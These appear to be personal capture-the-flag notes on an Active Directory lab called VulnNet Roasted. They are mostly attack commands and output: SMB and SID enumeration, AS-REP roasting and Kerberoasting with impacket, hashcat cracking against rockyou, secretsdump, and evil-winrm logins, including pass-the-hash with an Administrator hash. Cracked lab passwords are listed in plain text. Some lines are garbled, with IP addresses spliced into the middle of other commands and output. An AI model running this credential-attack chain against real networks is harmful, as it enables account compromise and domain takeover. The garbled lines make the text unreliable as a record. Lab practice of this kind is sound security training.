2022-07-05
vulnet roasted
# gryNet

TARGET = 10.10.70.244

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 19:20 CEST
PORT     STATE    SERVICE          VERSION
88/tcp   filtered kerberos-sec
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
389/tcp  filtered ldap
464/tcp  filtered kpasswd5
593/tcp  filtered http-rpc-epmap
636/tcp  filtered ldapssl
3269/tcp filtered globalcatLDAPssl
3389/tcp filtered ms-wbt-server
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```


        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing


# python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$IP
	Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
	
	Password:
	[*] Brute forcing SIDs at 10.10.70.244hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

	[*] StringBinding ncacn_np:10.10.70.244[\pipe\lsarpc]
	[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
	498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
	500: VULNNET-RST\Administrator (SidTypeUser)
	501: VULNNET-RST\Guest (SidTypeUser)
	502: VULNNET-RST\krbtgt (SidTypeUser)
	512: VULNNET-RST\Domain Admins (SidTypeGroup)
	513: VULNNET-RST\Domain Users (SidTypeGroup)
	514: VULNNET-RST\Domain Guests (SidTypeGroup)
	515: VULNNET-RST\Domain Computers (SidTypeGroup)
	516: VULNNET-RST\Domain Controllers (SidTypeGroup)
	517: VULNNET-RST\Cert Publishers (SidTypeAlias)
	518: VULNNET-RST\Schema Admins (SidTypeGroup)
	519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
	520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
	521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
	522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
	525: VULNNET-RST\Protected Users (SidTypeGroup)
	526: VULNNET-RST\Key Admins (SidTypeGroup)
	527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
	553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
	571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
	572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
	1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
	1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
	1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
	1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
	1105: VULNNET-RST\a-whitehat (SidTypeUser)
	1109: VULNNET-RST\t-skid (SidTypeUser)
	1110: VULNNET-RST\j-goldenhand (SidTypeUser)
	1111: VULNNET-RST\j-leet (SidTypeUser)	


# users:
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet


# python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile users.txt -no-pass -dc-ip $IP


		Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
		
		[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
		[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
		[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
		[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
		[-] User enterprise-core-vn doesn't have UF_DONT_REQ10.10.27.130UIRE_PREAUTH set
		[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
		$krb5asrep$23$t-skid@VULNNET-RST:c7d85e7b9e91178c88a5ef6973b1a66d$9baaf0e5aabf4249255bb53e901712b9dd43f4d014ee1703		7012713ae9988b813dd355bf584bcc57d0b06f5e6f23dd302df8a1b4331e06af0fa98633fc167b01c3bcad2a6e12b3693e41a9599bad3daf5e		860f2da278255dbd16f4ed01945dd79a8c6569532727458be3a33b6004a84433b96f80c6f5d2a07be39e498d0e53e5f402ca00cad335615b15		3cc84d35fcf555edfa116a6ff272e32d4f58f1a058d304eef3bd3402c689607f616840062d71d42fbcb1f5df4dbd95588d24d51ac275d9ca68		068ab8b80685d4dec4bab85b48532f5f8e9ca3d594564b22c239e0eaa52aa2449cb085b2d22ac6a7206ba3db5c		
		[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
		[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set

# hashcat --show hash.txt
# hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$t-skid@VULNNET-RST:097cfb9ab553575e6b4d392b709e3a07$599f0598bc9a533961c32cd30e410b5fccd1e60eae6cd44eebc356c60625282d70af86186a680d5294e88c3c9287baf79ccd4583250eacbf4e2fc35b1c9194ce4833ecf14fbcb765326e85d00fdf0431ec3b8396bfd755a008ae671fa36bd963491e90ec201338c619cf279463180ce5967841fcde6c4ec7df978c87d1aa3337026d01b3bb73edeecaa77448252baa5a534b74f73261a8e0ea2b8219d47c31d67bee7ec5da057d5072ce68abb87850075a6502c0d562de120f00828ab045b4481c9e1b2411408a19ea3e76ccc91272e2d6a292c7faed19aa7f917a5de81bc8223cbeb44c2a51c0f9e9bbfeeea5606866:tj072889*

t-skid:tj072889*

	# python3 /opt/impacket/examples/GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile keberoast.hash -dc-ip $IP

CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 20:45:09.913979  2021-03-14 00:41:17.987528


# hashcat --show keberoast.hash
# hashcat -m 13100 -a0 keberoast.hash /usr/share/wordlists/rockyou.txt -O
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$ab1ba0701bc1d73dae6c1f6bf19642b9$e0f412a61df9c8ee7a1998eab0e06e0a78756f313dfa014e00f237c0a6c051c18ff22711e984c59a411deb00719232f392afebb2e78463bb96b6a09ea44e247205c9830445aafdedb096362accaef5ce8e44888d74f8708d0b4f2b423ac103f65dbb304bb56ac368bcaa981892963dadb251894aebc262d57be5c36db690d806f84639e3bc09331573659d6e3d94e3594130554df130ce6dcb98e5c072413d52cdab14191420628e31820177e3460d19f7cc75f38e94a9508b617034dc97bd1c8f4c24d0b91dbefa2f9592e6ed86b399043c2ea8dfed894311540eb21e6d67834d1e75ef432dad74dbd545e8e7daa691a9045d75aebff359c4b4067b82b52c40566ae1a40b15afabf79b4074fa6f16e7d634af6c66b5140c0a762eab426c057770f0118980f4a4a1825a9a104387d98305e797a4385c277384ac2170bb75b1c18d856377ede0a2808db52a7dd91c991476cc36bd703a52043621526f3c2ffaaf4983b3335bbe16c0dfea4340d9b7509c509cc750119fbb9aef7249a627f7e1d0cdc2df15d1669ff751fe9794e0c671778952235502abf9737a7921b9addb3a815a2244e195bdafff1a97c19e1af831a61381250993fb04b827b6b7ac5b4c40ffa5f45c4486cc8cae1e6f6b1dca6c1b9ba31f0601f29a1d8b236660fbc61c1c6f20f0f73e754e1707526656b132a8c49dcd20e058a25679b97a9df5c074b17f3ba1450d53741cc2a226b8f120cc734f558329397858d4d2972f01f58bc000b83f4dafcef1532cec11cd4bcf5cbd1fabf7154afc55d3bdd7a2952ed58e048d224a6320b58e87cff179c57d2b2629a64e05db888feec75955bbfd56ef34a5ca4f76eb79a2187f77ace651265451ab91c95f3d565a6eb1494a6fc941efbc8365d323740b629262a842ddac3c5780926b1d8dbaec6a8aeca86a30be8063e6884a3f667445754af1110ccab005a0224cb6489ed7878ddf45911ad97859a6ffdfb9d5465cd8c20141451ca2384f55d5873694176636b86b5f65b834b70d1f253c38ee2e884ac3d1409d406881e9b057750ac41b75d3650c73d2e701dcfcc5f4104ba0a83be74a7ed2a541419df2a6111269c9eb2aa8a012e91fe526b29de76d038c0eb5fde76bddf239d40e2f55a7408482cefeaebee8a0e13ef1344f3a9795d9f47243b043f6d4121b59ef6a981d167e6c2970bfab73216480643ef745e6eb73e1736d455d8b1b25dcc743abdb938cd47825719bb39bcdd7a44b3259b3228f8c07a75b7c6d1ef1ccc8ed2622fe53c8a4b2dc752a28b23bb4fe55049da1dc2c7b7a494eaad5ea1d0a09a862b2f97f051189a253d506cc561f06205061ceb828b9b2d9204298878dc1ef057258da6938fe0866c22ca977ce4885e78e9afebb31ce:ry=ibfkfv,s6h,

	evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i $IP
	smbmap 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i $IP
	python3 /opt/impacket/examples/secretsdump.py 'VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.27.130'
	evil-winrm -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' -i 10.10.27.130


evil-winrm -i 10.10.27.130 -u 'Administrator' -H c2597747aa5e43022a3a3049a3c3b09d
users:passwords

enterprise-core-vn:ry=ibfkfv,s6h,
a-whitehat:bNdKVkjv3RR9ht

